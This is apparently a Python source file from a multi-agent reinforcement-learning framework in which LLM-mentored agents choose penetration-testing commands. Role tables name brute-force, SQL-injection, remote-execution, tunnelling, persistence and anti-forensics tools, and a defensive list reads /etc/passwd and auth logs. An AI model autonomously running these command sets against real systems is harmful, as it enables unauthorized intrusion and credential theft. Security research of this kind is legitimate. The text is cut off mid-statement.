"""
Smart Coach - Enhanced ApprenticeCoach with command registry and intelligent mentoring.

This module provides a SmartCoach class that integrates:
- Command Registry for validated, structured commands
- Smart Mentor for intelligent LLM prompting
- Smart Reward Calculator for better learning signals
- Attack Context for rich state representation
"""

import time
import logging
import hashlib
from typing import Optional, Dict, Any, List, Set, Tuple, TYPE_CHECKING
from dataclasses import dataclass, field

from core.commands.command_registry import (
    AttackPhase,
    CommandTemplate,
    CommandChoice,
    COMMAND_REGISTRY,
    get_valid_commands_for_state,
    get_phase_from_state,
    render_command,
)
from core.commands.learned_commands import (
    LearnedCommandStore,
    get_learned_store,
)
from core.llm.smart_mentor import (
    SmartMentor,
    AttackContext,
    MentorResponse,
    DualMentor,
    DualMentorResponse,
)
from core.llm.reward_calculator import (
    SmartRewardCalculator,
    RewardBreakdown,
)
from core.training.mentor_policy import MentorPolicy, MentorPolicyConfig
from core.training.mentor_controller import (
    MentorController, MentorControllerConfig, MentorEngagement, MentorTier,
)

if TYPE_CHECKING:
    from core.gpt_manager import GPTManager
    from core.postmortem import SkillLibrary
    from core.tracing import TraceWriter

logger = logging.getLogger("ariaska.smart_coach")

# Phase 4: Lazy imports to avoid circular deps
_ppo_agent_cls = None
_ppo_config_cls = None
_mapper_cls = None
_encode_state_fn = None
_sac_agent_cls = None
_sac_config_cls = None


def _lazy_ppo():
    """Lazy-load PPO and mapper to avoid import loops."""
    global _ppo_agent_cls, _ppo_config_cls, _mapper_cls, _encode_state_fn
    if _ppo_agent_cls is None:
        try:
            from core.algorithms.ppo_agent import PPOAgent as _pa, PPOConfig as _pc
            from core.algorithms.command_action_mapper import CommandActionMapper as _cm
            from core.models.state_encoder import encode_state as _es
            _ppo_agent_cls = _pa
            _ppo_config_cls = _pc
            _mapper_cls = _cm
            _encode_state_fn = _es
        except ImportError as e:
            logger.warning(f"PPO/mapper not available: {e}")
    return _ppo_agent_cls, _ppo_config_cls, _mapper_cls, _encode_state_fn


def _lazy_sac():
    """Lazy-load SAC to avoid import loops."""
    global _sac_agent_cls, _sac_config_cls
    if _sac_agent_cls is None:
        try:
            from core.algorithms.sac_agent import SACAgent as _sa, SACConfig as _sc
            _sac_agent_cls = _sa
            _sac_config_cls = _sc
        except ImportError as e:
            logger.warning(f"SAC not available: {e}")
    return _sac_agent_cls, _sac_config_cls


@dataclass
class SmartDecisionResult:
    """Result of a smart coach decision with full context."""
    
    # Command info
    command: str
    template_name: str = ""
    params: Dict[str, str] = field(default_factory=dict)
    
    # Mentor info
    mentor_call: bool = False
    model_used: Optional[str] = None
    mentor_reasoning: Optional[str] = None
    mentor_delta: str = "kept"
    mentor_provider: str = "gpt"  # "gpt", "venice", "gpt_consensus", "venice_consensus", etc.
    
    # Phase info
    phase: AttackPhase = AttackPhase.RECON
    phase_advanced: bool = False
    
    # Reward info
    reward_breakdown: Optional[RewardBreakdown] = None
    
    # Confidence and metadata
    confidence: float = 0.5
    skill_cards: List[Dict[str, Any]] = field(default_factory=list)
    timestamp: float = field(default_factory=time.time)

    def __post_init__(self) -> None:
        """Clamp confidence to [0.0, 1.0] — prevents impossible percentages (e.g. 171%)."""
        self.confidence = min(1.0, max(0.0, float(self.confidence)))
    
    # Command output (simulated or real)
    command_output: str = ""
    
    # Token tracking
    tokens_used: int = 0
    
    # Phase 0.1: Decision source tracking
    source: str = "unknown"  # "mentor", "policy", "forced", "fallback", "registry"
    forced: bool = False  # True if this was a forced-novel action
    forced_reason: str = ""  # Why it was forced: "repeat_stuck", "deep_stuck", etc.
    excluded_count: int = 0  # Number of actions masked/excluded
    tag_info: str = ""  # Tag overlap debug info
    
    # Phase 6: Mentor imitation learning
    _mentor_suggestion: Optional[str] = None  # Template name mentor suggested (for imitation bonus)
    
    # Anti-repeat penalty tracking
    _repeat_penalty: float = 0.0
    
    # Phase 6.3: Reasoning trace — why this decision was made
    reasoning: str = ""  # Human-readable chain: "PPO proposed nmap → anti-repeat blocked → registry fallback to nikto"
    belief_snapshot: Dict[str, Any] = field(default_factory=dict)  # Agent's belief state at decision time

    # Phase 27: Evidence gate result
    evidence_gate_result: str = ""  # "", "pass", "log_reject", "enforce_reject"
    evidence_gate_reasons: List[str] = field(default_factory=list)

    # Phase 40: Decision chain trace — records each pipeline stage
    decision_trace: List[Dict[str, Any]] = field(default_factory=list)
    
    @property
    def chosen_action(self) -> str:
        """Alias for compatibility with existing code."""
        return self.command
    
    @property
    def is_dual_mentor(self) -> bool:
        """Check if this decision used dual mentor."""
        return self.mentor_provider not in ("gpt", "offline", "none")


@dataclass
class SmartStepContext:
    """Enhanced step context with attack state."""
    
    # Episode info
    episode: int
    step: int
    agent_name: str
    
    # Attack context
    attack_context: AttackContext = field(default_factory=AttackContext)  # type: ignore[call-arg]
    
    # Raw state for compatibility
    state: Dict[str, Any] = field(default_factory=dict)
    
    @property
    def phase(self) -> str:
        """Get phase name for compatibility."""
        return self.attack_context.current_phase.name.lower()
    
    @property
    def target_ip(self) -> str:
        return self.attack_context.target


import random

class SmartCoach:
    """
    Enhanced coach with command registry and intelligent mentoring.
    
    This coach:
    1. Uses the command registry to ensure valid commands
    2. Provides rich attack context to the LLM
    3. Uses smart reward calculation for better learning
    4. Tracks learned commands for experience-based improvement
    5. ROLE-BASED: Each agent has a specific role that filters commands
    
    Works alongside existing ApprenticeCoach - can be used as drop-in
    replacement or in parallel.
    """
    
    # ==========================================================================
    # AGENT ROLE DEFINITIONS - Each agent has UNIQUE focus and NON-OVERLAPPING commands
    # ==========================================================================
    AGENT_ROLES = {
        "ScoutAgent": {
            "role": "recon",
            "description": "🔍 Reconnaissance & Discovery - port scanning, service enumeration, OSINT",
            "primary_phases": [AttackPhase.RECON, AttackPhase.ENUMERATION],
            "preferred_commands": [
                # EXCLUSIVE to Scout - Network mapping and service detection
                "nmap_quick_scan", "nmap_top_ports", "nmap_service_version", "nmap_os_detection",
                "masscan_fast", "nmap_udp_scan", "rustscan",
                # DNS/Domain - Scout ONLY
                "dig_any", "whois_lookup", "dns_zone_transfer", "dnsrecon", "host_lookup",
                # Initial web fingerprinting - Scout ONLY
                "whatweb", "curl_headers", "wafw00f", "wappalyzer",
            ],
            "command_tags": {"network", "discovery", "scanning", "dns", "recon"},
            # R42: Added post/post-exploit/credential/lateral/antiforensics/keylogger/ssh_keys
            # to prevent forced-novel from assigning post-exploitation commands to Scout
            "avoid_tags": {"exploit", "privesc", "persistence", "defense", "attack", "bruteforce",
                           "smb", "enum", "stealth", "post", "post-exploit", "credential",
                           "lateral", "antiforensics", "keylogger", "ssh_keys", "cleanup",
                           "timestomp", "closeout"},
            "exclusive_prefixes": ["nmap", "masscan", "dig", "whois", "dns", "rustscan", "host", "wafw00f"],  # Scout OWNS these
        },
        "RedAgent": {
            "role": "offensive",
            "description": "⚔️ Offensive Operations - exploitation, brute force, active attacks",
            "primary_phases": [AttackPhase.EXPLOITATION, AttackPhase.PRIVILEGE_ESCALATION, AttackPhase.POST_EXPLOITATION],
            "preferred_commands": [
                # EXCLUSIVE to Red - Exploitation and brute force
                "searchsploit", "sqlmap_get", "sqlmap_post", "sqlmap_crawl",
                "hydra_ssh", "hydra_ftp", "hydra_smb", "hydra_web",
                "crackmapexec_smb", "crackmapexec_winrm", "crackmapexec_ldap",
                "impacket_psexec", "impacket_smbexec", "impacket_wmiexec",
                "evil_winrm", "msfconsole",
                # Vulnerability scanning - Red ONLY
                "nikto", "nuclei_scan", "wpscan", "joomscan",
            ],
            "command_tags": {"exploit", "attack", "offensive", "bruteforce", "vuln", "aggressive"},
            "avoid_tags": {"defense", "monitoring", "passive", "recon", "stealth", "scanning"},
            "exclusive_prefixes": ["hydra", "sqlmap", "searchsploit", "crackmapexec", "impacket", "evil", "msf", "nikto", "nuclei", "wpscan", "joomscan"],
            "aggressive_recon": False,  # Red should NOT use recon tools
        },
        "BlueAgent": {
            "role": "defensive",
            "description": "🛡️ Defensive Analysis - log review, threat detection, security monitoring",
            "primary_phases": [AttackPhase.ENUMERATION, AttackPhase.POST_EXPLOITATION],
            "preferred_commands": [],  # Uses custom defensive commands
            "command_tags": {"defense", "monitoring", "analysis", "logs", "forensics"},
            # R42: Added post/post-exploit/keylogger/persistence/lateral/antiforensics
            # to prevent forced-novel from assigning offensive post-exploit commands to Blue
            "avoid_tags": {"exploit", "attack", "bruteforce", "post", "post-exploit",
                           "keylogger", "persistence", "lateral", "antiforensics",
                           "timestomp", "credential"},
            "custom_commands": [
                ("netstat -tlnp", "List listening TCP ports"),
                ("ss -tlnp", "Socket statistics"),
                ("ps aux --sort=-%mem | head -20", "Top memory processes"),
                ("last -n 15", "Recent logins"),
                ("cat /var/log/auth.log 2>/dev/null | tail -30", "Auth logs"),
                ("who", "Logged in users"),
                ("w", "User activity"),
                ("lsof -i -P -n | head -30", "Network connections"),
                ("find /tmp -type f -mmin -30 2>/dev/null | head -20", "Recent /tmp files"),
                ("cat /etc/passwd | grep -v nologin", "Users with shells"),
                ("crontab -l 2>/dev/null", "Scheduled tasks"),
                ("systemctl list-units --type=service --state=running | head -20", "Running services"),
                ("df -h", "Disk usage"),
                ("free -m", "Memory usage"),
                ("uptime", "System uptime"),
                ("id", "Current user"),
                ("env | head -20", "Environment variables"),
                ("ls -la /home", "Home directories"),
            ],
            "exclusive_prefixes": ["netstat", "ss ", "ps ", "last", "who", "lsof", "crontab", "systemctl", "df ", "free ", "uptime", "id", "env"],
        },
        "OrionAgent": {
            "role": "strategic",
            "description": "🎯 Strategic Coordination - vulnerability research, exploit selection",
            "primary_phases": [AttackPhase.ENUMERATION, AttackPhase.EXPLOITATION],
            "preferred_commands": [
                # Phase 42: Orion is STRATEGIC ANALYSIS ONLY — no scanning/recon.
                # Removed: nmap_vuln_scan, nmap_aggressive (belong to Scout/Red).
                # Orion researches vulns and suggests exploit paths, does NOT scan.
                "searchsploit_search", "msfconsole_search",
            ],
            "command_tags": {"comprehensive", "analysis", "directory", "ldap", "vuln"},
            # Phase 42: Added nmap, hydra, nikto, gobuster, ffuf, curl, wget, nc,
            # dirb, wfuzz, enum4linux, smbclient, rpcclient to prevent overlap
            # with Red/Scout/Shadow tools. Orion should ONLY do research.
            "avoid_tags": {"defense", "stealth", "scanning", "exploit", "bruteforce",
                           "shell", "ssh", "backdoor", "creds", "post", "post-exploit",
                           "credential", "lateral", "antiforensics", "keylogger",
                           "ssh_keys", "persistence", "timestomp", "cleanup", "closeout",
                           "nmap", "hydra", "nikto", "gobuster", "ffuf", "dirb", "wfuzz",
                           "enum4linux", "smbclient", "rpcclient", "nc", "curl", "wget",
                           "recon", "access"},
            # Phase 8.2 Batch 14: Removed gobuster/ffuf/feroxbuster/dirsearch from Orion
            "exclusive_prefixes": ["ldap", "bloodhound", "kerb", "burp", "windap",
                                   "searchsploit", "msfconsole"],
            "is_coordinator": True,
        },
        "ShadowAgent": {
            "role": "stealth",
            "description": "👤 Stealth Operations - SMB/RPC enum, persistence, evasion",
            "primary_phases": [AttackPhase.ENUMERATION, AttackPhase.POST_EXPLOITATION, AttackPhase.EXFILTRATION],
            "preferred_commands": [
                # EXCLUSIVE to Shadow - SMB/RPC enumeration (stealthy)
                "enum4linux", "enum4linux_ng", "smbclient_list", "smbmap", "rpcclient_enum",
                # SSH/Tunneling - Shadow ONLY
                "ssh_key_login", "chisel_client", "socat_tunnel", "nc_listener", "nc_connect",
                # Post-exploit recon - Shadow ONLY
                "linpeas", "pspy", "ssh_audit",
            ],
            "command_tags": {"stealth", "evasion", "quiet", "passive", "persistence", "exfil", "smb", "enum"},
            "avoid_tags": {"loud", "aggressive", "bruteforce", "scanning", "web"},
            "exclusive_prefixes": ["enum4linux", "smbclient", "smbmap", "rpcclient", "chisel", "socat", "linpeas", "pspy", "ssh-audit", "ssh_audit"],
            "stealth_mode": True,
        },
    }
    
    def __init__(
        self,
        agent_name: str,
        gpt_manager: "GPTManager",
        mentor_policy: Optional[MentorPolicy] = None,
        mentor_controller: Optional[MentorController] = None,
        skill_library: Optional["SkillLibrary"] = None,
        trace_writer: Optional["TraceWriter"] = None,
        learned_store: Optional[LearnedCommandStore] = None,
        reward_calculator: Optional[SmartRewardCalculator] = None,
        mentor_log_path: Optional[str] = None,
        model: str = "local-llm",  # Phase 12.1: full reasoning for all mentor calls
        tactical_cortex: Optional[Any] = None,
        executive_cortex: Optional[Any] = None,
        budget_controller: Optional[Any] = None,
    ):
        self.agent_name = agent_name
        self.gpt_manager = gpt_manager
        self.mentor_policy = mentor_policy or MentorPolicy()
        self.mentor_controller = mentor_controller  # Phase 6.2: 3-tier mentor engagement
        self.skill_library = skill_library
        self.trace_writer = trace_writer
        self.mentor_log_path = mentor_log_path
        self.model = model
        
        # ─── PHASE 10: Cortex integration ────────────────────────────
        self.tactical_cortex = tactical_cortex    # Per-step quality gate
        self.executive_cortex = executive_cortex  # Episode-level strategic planner
        
        # ─── PHASE 11.0: Adaptive budget gating ──────────────────────
        self.budget_controller = budget_controller  # AdaptiveBudgetController instance
        
        # R42: Forced-novel cap per episode — prevent forced dominance
        self._forced_novel_count = 0
        self._forced_novel_max = 3  # Max forced-novel selections per episode
        
        # Get agent role configuration
        self.agent_role = self.AGENT_ROLES.get(agent_name, {
            "role": "generic",
            "description": "Generic agent",
            "primary_phases": list(AttackPhase),
            "preferred_commands": [],
            "command_tags": set(),
            "avoid_tags": set(),
        })
        
        # Smart components
        self.learned_store = learned_store or get_learned_store()
        self.reward_calculator = reward_calculator or SmartRewardCalculator()
        self.smart_mentor: Optional[SmartMentor] = None
        self.dual_mentor: Optional[DualMentor] = None  # GPT + Venice dual mentor
        
        # Initialize smart mentor if GPT manager has async client
        self._init_smart_mentor()
        
        # Attack context (shared across steps)
        self.attack_context: Optional[AttackContext] = None
        
        # Decision history
        self.decisions: List[SmartDecisionResult] = []

        # C06: Decision source win-rate EMA tracker
        from core.training.source_win_rate import SourceWinRateTracker
        self.source_win_rate = SourceWinRateTracker(alpha=0.1, reward_alpha=0.15)
        
        # Current episode tracking
        self.current_episode = 0
        
        # Track used commands to avoid duplicates
        self.step_used_commands: set = set()  # Within single step
        self.episode_used_commands: set = set()  # Across entire episode
        self.command_repeat_count: Dict[str, int] = {}  # Count repeats
        
        # Phase 5.2+: Adaptive curriculum tracking
        self._episode_rewards: List[float] = []  # Recent episode total rewards
        self._episode_discovery_counts: List[int] = []  # Recent episode discoveries
        self._episode_diversity_ratios: List[float] = []  # Recent diversity ratios
        self._adaptive_history_window = 10  # Look back N episodes
        
        # ─── Phase 8.0: Cross-episode attack chain memory ────────────────
        # Remembers successful command sequences that led to discoveries/shells.
        # Used to bias future episode decisions toward proven attack chains.
        self._successful_chains: List[Dict[str, Any]] = []  # [{commands: [...], reward: float, phase: str}]
        self._best_chain: Optional[Dict[str, Any]] = None  # Highest reward chain across all episodes
        self._episode_chain: List[str] = []  # Current episode's command sequence
        self._episode_chain_rewards: List[float] = []  # Per-step rewards this episode
        self._chain_memory_size = 20  # Keep top N chains
        
        # ─── Phase 8.0: Agent reasoning state ────────────────────────────
        # Persistent reasoning context that carries between steps.
        self._reasoning_hypotheses: List[str] = []  # Current working hypotheses
        self._reasoning_failures: List[str] = []  # What failed and why
        self._reasoning_plan: Optional[str] = None  # Current attack plan from mentor
        self._exploration_score: float = 1.0  # Decays as we repeat actions, resets on new discovery
        
        # ─── Output lessons (recorded from command output analysis) ──────
        self._output_lessons: List[str] = []
        self._max_output_lessons: int = 75  # Phase 11.5: +50% (was 50)
        self._output_patterns_learned: List[str] = []  # Phase 11.5: Fixed init (was missing)
        
        logger.debug(f"SmartCoach initialized for {agent_name} | Role: {self.agent_role['role']} | {self.agent_role['description']}")

        # ─── PHASE 7.4: Tool availability check (one-time at init) ───────────
        # Cache which tool binaries exist on the system so we don't waste
        # steps on commands for tools that aren't installed.
        self._unavailable_tools: set = set()
        self._check_tool_availability()

        # ─── Phase 9: CognitiveBus reference (lazy singleton) ────────────
        self._cognitive_bus = None  # Lazy-loaded via _get_cognitive_bus()

        # ─── Phase 9.1: HybridMemory reference (lazy singleton) ─────────
        self._hybrid_memory = None  # Lazy-loaded via _get_hybrid_memory()

        # =====================================================================
        # PHASE 4: Per-role PPO agent + CommandActionMapper
        # PPO drives command selection within each role's action pool.
        # =====================================================================
        self.action_mapper = None
        self.ppo_agent = None
        self._ppo_trajectory: List[Dict[str, Any]] = []
        self._ppo_pending: Optional[Dict[str, Any]] = None  # awaiting reward
        self._ppo_step_count = 0
        try:
            PPOAgent, PPOConfig, Mapper, _ = _lazy_ppo()
            if Mapper and PPOAgent and PPOConfig:
                self.action_mapper = Mapper(agent_name)
                if self.action_mapper.action_dim > 0:
                    # C07: Wire FF_PER_LOSS_GRAD_LOG to PPOConfig.log_grad_norms
                    from core.feature_flags import get_feature_flags as _get_ff_ppo
                    config = PPOConfig(
                        state_dim=512,
                        action_dim=self.action_mapper.action_dim,
                        hidden_dims=[256, 256, 128],
                        learning_rate=8e-4,       # Phase 13.0: +60% (was 5e-4) — aggressive initial learning
                        epochs_per_update=6,      # Phase 6.4: More gradient steps per update
                        minibatch_size=8,         # Low: each coach gets ~5-10 PPO transitions/ep
                        rollout_size=16,          # Phase 6.4: More frequent updates
                        entropy_coef=0.08,        # Phase 13.0: +60% (was 0.05) — high initial exploration
                        entropy_coef_min=0.01,    # Phase 13.0: +100% (was 0.005) — maintain exploration floor
                        log_grad_norms=_get_ff_ppo().per_loss_grad_log,  # C07
                    )
                    self.ppo_agent = PPOAgent(config=config, device="cpu")
                    logger.info(
                        f"[PPO] {agent_name}: action_dim={self.action_mapper.action_dim} "
                        f"network params={sum(p.numel() for p in self.ppo_agent.network.parameters())}"
                    )
        except Exception as e:
            logger.warning(f"PPO init failed for {agent_name}: {e}")

        # =====================================================================
        # PHASE 7.0: SAC Agent (Soft Actor-Critic) — Entropy-regularized RL
        # SAC provides better exploration via entropy bonus (MaxEnt RL).
        # Runs ALONGSIDE PPO — SAC handles exploration-heavy phases,
        # PPO handles exploitation phases. Off-policy = sample efficient.
        # =====================================================================
        self.sac_agent = None
        self._sac_enabled = True  # Feature flag
        try:
            from core.algorithms.sac_agent import SACAgent, SACConfig
            if self._sac_enabled and self.action_mapper and self.action_mapper.action_dim > 0:
                sac_config = SACConfig(
                    state_dim=512,
                    action_dim=self.action_mapper.action_dim,
                    hidden_dims=[256, 256, 128],
                    actor_lr=3e-4,
                    critic_lr=3e-4,
                    alpha=0.2,           # Initial entropy temperature
                    auto_alpha=True,     # Auto-tune for optimal exploration
                    buffer_size=50000,
                    batch_size=64,
                    min_buffer_size=64,
                    warmup_steps=50,
                )
                self.sac_agent = SACAgent(config=sac_config)
                logger.debug(f"[SAC] {agent_name}: action_dim={self.action_mapper.action_dim} α=0.2 (auto)")
        except Exception as e:
            logger.debug(f"SAC init skipped for {agent_name}: {e}")
        self._sac_pending = None  # C03: SAC shadow select pending transition

        # =====================================================================
        # PHASE 9.0: DDQN Macro-Intent Selector (Hierarchical RL)
        # DDQN picks strategic macro-intent → PPO picks command within macro.
        # Off-policy Double DQN with target network + experience replay.
        # =====================================================================
        self.ddqn_macro = None
        self._active_macro = None       # Current macro-intent for this step
        self._active_macro_q = None     # Q-values from DDQN for this step
        self._ddqn_confidence = 0.0     # DDQN Q-value separation (for mentor)
        self._ddqn_pending = None       # Pending DDQN transition (state, macro)
        self._ddqn_prev_macro = None    # R57 Layer 1: Previous macro for switch penalty
        self._last_step_had_discovery = False  # R57 Layer 1: Discovery signal for DDQN
        try:
            from core.algorithms.ddqn_macro import DDQNMacro, DDQNConfig
            ddqn_config = DDQNConfig(state_dim=512, num_macros=9)
            self.ddqn_macro = DDQNMacro(config=ddqn_config, device="cpu")
        except Exception as e:
            logger.debug(f"DDQN macro init skipped for {agent_name}: {e}")

        # =====================================================================
        # LAYER 3: CODEX META-LAYER — Strategic stagnation-breaking
        # Uses local-llm for high-level reasoning when agents get stuck
        # in a phase for too long without discoveries. Budget-controlled:
        # max 5 calls/episode, 2-step cooldown between calls.
        # R60: Increased budget 3→5, cooldown 4→2, lower thresholds.
        # =====================================================================
        self._codex_meta_calls_episode = 0
        self._codex_meta_max_per_episode = 1  # Phase 53: 2→1 — minimal codex
        self._codex_meta_cooldown = 0
        self._codex_meta_phase_steps = 0
        self._codex_meta_last_phase = None
        self._codex_meta_gate_overrides = 0  # R60: Track PHASE-GATE overrides for storm trigger
        self._codex_meta_antirepeat_hits = 0  # R60: Track anti-repeat hits for spike trigger
        self._codex_meta_used_templates: set = set()  # R62: Track used codex templates for dedup

        # ─── R66: Codex Strategic role (episode-level plan repair) ───
        self._codex_strategic_calls_episode = 0
        self._codex_strategic_max_per_episode = 1  # Phase 53: 3→1 — minimal strategic
        self._codex_strategic_cooldown = 0
        # R66: Coherence + macro_conf injected from orchestrator each step
        self._r66_coherence: float = 0.5
        self._r66_macro_conf: float = 0.5
        self._r66_env_tag: str = "ms2"  # overridden by orchestrator

        # ─── R67: Reward velocity + adaptive codex budget ────────────
        self._r67_velocity: float = 0.0      # Injected from orchestrator
        self._r67_stalling: bool = False      # True when reward velocity stalled
        self._r67_codex_bonus_budget: int = 0 # Extra codex calls granted by stall

        # ─── Phase 27: Micro-Chain (nano→mini→nano scoring) ──────────
        self._micro_chain = None
        try:
            from core.feature_flags import get_feature_flags as _get_ff27
            if _get_ff27().use_micro_chain and self.gpt_manager is not None:
                from core.llm.micro_chain import MicroChain
                self._micro_chain = MicroChain(gpt_manager=self.gpt_manager)
                logger.debug(f"[P27] MicroChain initialized for {agent_name}")
        except Exception as e:
            logger.debug(f"[P27] MicroChain init skipped for {agent_name}: {e}")

        # ─── Phase 34: PhaseGuidedLLM (structured guidance + distillation) ─
        self._phase_guided: Any = None
        try:
            if self.gpt_manager is not None:
                from core.llm.phase_guided_llm import PhaseGuidedLLM
                self._phase_guided = PhaseGuidedLLM(gpt_manager=self.gpt_manager)
                logger.debug(f"[P34] PhaseGuidedLLM initialized for {agent_name}")
        except Exception as e:
            logger.debug(f"[P34] PhaseGuidedLLM init skipped for {agent_name}: {e}")

        # ─── Phase 27: Evidence gate counters ────────────────────────
        self._evidence_gate_total = 0
        self._evidence_gate_rejects = 0
        self._evidence_gate_reject_but_discovered = 0

        # ─── R68: Phase-gated PPO head override ──────────────────────
        self._r68_forced_phase_group: Optional[int] = None  # Codex can force phase head

        # =====================================================================
        # PHASE 8 / C04: COGNITION NODE — RE-ENABLED with 3 bug fixes
        # B1: DDQN macro action_idx=-1 (no longer fused with PPO indices)
        # B2: SIL uses proper value estimate (critic forward) not value=0.0
        # B3: _vote_ppo() delegates to PPO.select_action() (R67-R80 preserved)
        # C07: Gated by FF_COGNITION_NODE feature flag
        # =====================================================================
        self.cognition_node = None
        from core.feature_flags import get_feature_flags as _get_ff
        _ff = _get_ff()
        if _ff.cognition_node:
            try:
                from core.algorithms.cognition_node import CognitionNode, CognitionConfig
                _cn_ppo = self.ppo_agent if hasattr(self, 'ppo_agent') else None
                _cn_sac = self.sac_agent if hasattr(self, 'sac_agent') else None
                _cn_ddqn = self.ddqn_macro if hasattr(self, 'ddqn_macro') else None
                # RND lives in SmartOrchestrator, not SmartCoach — pass None here
                self.cognition_node = CognitionNode(
                    config=CognitionConfig(),
                    ppo=_cn_ppo,
                    sac=_cn_sac,
                    ddqn=_cn_ddqn,
                    rnd=None,  # RND is orchestrator-level, injected via DecisionPacket
                )
                logger.debug(f"[CognitionNode] {agent_name}: enabled with B1+B2+B3 fixes")
            except Exception as e:
                logger.debug(f"CognitionNode init skipped for {agent_name}: {e}")
        else:
            logger.debug(f"[CognitionNode] {agent_name}: DISABLED by FF_COGNITION_NODE=false")
        self._cognition_result = None  # C04: per-step result, set in decide()
        self._last_grad_norms: Dict[str, float] = {}  # C05: latest PPO update grad norms

        # =====================================================================
        # PHASE 8: CODEX PERSONA ROUTER — 4-persona Codex/Claude routing
        # Tactical, Strategic, Researcher, Ventriloquist personas with
        # registry-validated outputs.
        # =====================================================================
        self.persona_router = None
        try:
            from core.llm.codex_personas import CodexPersonaRouter
            if self.gpt_manager is not None:
                self.persona_router = CodexPersonaRouter(gpt_manager=self.gpt_manager)
                logger.debug(f"[PERSONAS] {agent_name}: 4-persona router initialized")
        except Exception as e:
            logger.debug(f"CodexPersonaRouter init skipped for {agent_name}: {e}")

        # =====================================================================
        # PHASE 10.0: Cloud LLM Roles — feature-flagged acceleration
        # 5 roles: StrategicPlanner, TacticalAdvisor, JudgeRanker,
        # PostmortemSkillExtractor, DAggerCorrector.
        # All OFF by default. resolve_profile() flips ON when CLOUD detected.
        # =====================================================================
        self._cloud_roles_initialized = False
        self._strategic_planner = None
        self._tactical_advisor = None
        self._judge_ranker = None
        self._postmortem_extractor = None
        self._dagger_corrector = None

        # =====================================================================
        # PHASE 14.0: Autonomous Reasoning Architecture
        # TeacherTrace + BCBuffer, AutonomyScheduler, HypothesisGenerator,
        # EvidenceGraph, LessonExtractor — all feature-flag gated.
        # =====================================================================
        self._p14_autonomy_scheduler = None
        self._p14_bc_buffer = None
        self._p14_hypothesis_gen = None
        self._p14_evidence_graph = None
        self._p14_lesson_extractor = None
        self._p14_traces_this_episode: List[Any] = []
        self._p14_initialized = False
        try:
            from core.feature_flags import get_feature_flags
            _ff = get_feature_flags()
            if _ff.teacher_trace:
                from core.reasoning.teacher_trace import BCBuffer
                self._p14_bc_buffer = BCBuffer(capacity=2000)
            if _ff.autonomy_scheduler:
                from core.training.autonomy_scheduler import AutonomyScheduler
                self._p14_autonomy_scheduler = AutonomyScheduler()
                self._p14_autonomy_scheduler.register_agent(agent_name)
            if _ff.hypothesis_engine:
                from core.reasoning.hypothesis import HypothesisGenerator
                self._p14_hypothesis_gen = HypothesisGenerator()
            if _ff.evidence_graph:
                from core.knowledge.evidence_graph import EvidenceGraph
                self._p14_evidence_graph = EvidenceGraph()
            self._p14_initialized = True
            # Wire BC buffer into PPO config if both exist
            if _ff.bc_loss and self._p14_bc_buffer is not None and self.ppo_agent is not None:
                self.ppo_agent.config.use_bc_loss = True
                self.ppo_agent.config.bc_buffer = self._p14_bc_buffer
                logger.debug(f"[P14] BC loss wired into PPO for {agent_name}")
            logger.debug(
                f"[P14] {agent_name}: tt={_ff.teacher_trace} auto={_ff.autonomy_scheduler} "
                f"hyp={_ff.hypothesis_engine} eg={_ff.evidence_graph} bc={_ff.bc_loss}"
            )
        except Exception as e:
            logger.debug(f"[P14] Init skipped for {agent_name}: {e}")

        # =====================================================================
        # PHASE 37: Level 5 GPT ↔ RL Integration — LLMPolicyBridge
        # Central nervous system connecting LLM intelligence to PPO nets.
        # Computes LLM features, action priors, teacher distributions.
        # All influence decays via teacher anneal → autonomous policy.
        # =====================================================================
        self._p37_llm_bridge = None
        self._p37_last_guidance = None
        self._p37_last_mc_result = None   # Raw MicroChainResult for bridge
        self._p37_last_pg_result = None   # Raw PhaseGuidedResult for bridge
        try:
            from core.feature_flags import get_feature_flags
            _ff37 = get_feature_flags()
            if getattr(_ff37, 'llm_policy_bridge', True) and self.ppo_agent is not None:
                from core.llm.llm_policy_bridge import LLMPolicyBridge
                self._p37_llm_bridge = LLMPolicyBridge(
                    action_dim=self.ppo_agent.config.action_dim,
                )
                # Enable Level 5 features on PPO config
                self.ppo_agent.config.use_llm_prior = True
                self.ppo_agent.config.use_kl_teacher_loss = True
                self.ppo_agent.config.use_ranking_loss = True
                self.ppo_agent.config.use_value_reg_loss = True
                logger.info(
                    f"[P37] {agent_name}: LLMPolicyBridge initialized — "
                    f"Level 5 GPT↔RL integration ACTIVE"
                )
        except Exception as e:
            logger.debug(f"[P37] LLMPolicyBridge init skipped for {agent_name}: {e}")

        # =====================================================================
        # PHASE 15.0: Neurovortex — Neuromodulators, Reflex, Arbitrator,
        # Aggression, Sensory Buffer, Working Memory, Consolidation.
        # All feature-flag gated — default OFF = zero behaviour change.
        # =====================================================================
        self._p15_neuromod_engine = None
        self._p15_neuromod_state = None
        self._p15_neuromod_history = None
        self._p15_sensory_buffer = None
        self._p15_aggression_controller = None
        self._p15_aggression_history = None
        self._p15_aggression_level: float = 0.3
        self._p15_reflex_policy = None
        self._p15_action_arbitrator = None
        self._p15_working_memory = None
        self._p15_consolidation_engine = None
        self._p15_semantic_index = None
        self._p15_initialized = False
        try:
            from core.feature_flags import get_feature_flags
            _ff15 = get_feature_flags()
            if _ff15.neuromodulators:
                from core.neuro.neuromodulators import (
                    NeuromodulatorEngine, NeuromodulatorHistory, NeuromodulatorState,
                )
                self._p15_neuromod_engine = NeuromodulatorEngine()
                self._p15_neuromod_state = NeuromodulatorState()
                self._p15_neuromod_history = NeuromodulatorHistory()
            if _ff15.sensory_buffer:
                from core.neuro.sensory_buffer import SensoryBuffer
                self._p15_sensory_buffer = SensoryBuffer()
            if _ff15.aggression_controller:
                from core.neuro.aggression_controller import (
                    AggressionController, AggressionHistory,
                )
                self._p15_aggression_controller = AggressionController()
                self._p15_aggression_history = AggressionHistory()
            if _ff15.reflex_policy:
                from core.neurorouter.reflex_policy import ReflexPolicy
                self._p15_reflex_policy = ReflexPolicy()
            if _ff15.action_arbitrator:
                from core.neurorouter.action_arbitrator import ActionArbitrator
                self._p15_action_arbitrator = ActionArbitrator()
            if _ff15.working_memory:
                from core.memory.working_memory import WorkingMemory
                self._p15_working_memory = WorkingMemory()
            if _ff15.consolidation:
                from core.training.consolidation import ConsolidationEngine
                self._p15_consolidation_engine = ConsolidationEngine()
            if _ff15.semantic_index:
                from core.memory.semantic_index import SemanticIndex
                self._p15_semantic_index = SemanticIndex()
            self._p15_initialized = True
            logger.debug(
                f"[P15] {agent_name}: neuromod={_ff15.neuromodulators} "
                f"reflex={_ff15.reflex_policy} arb={_ff15.action_arbitrator} "
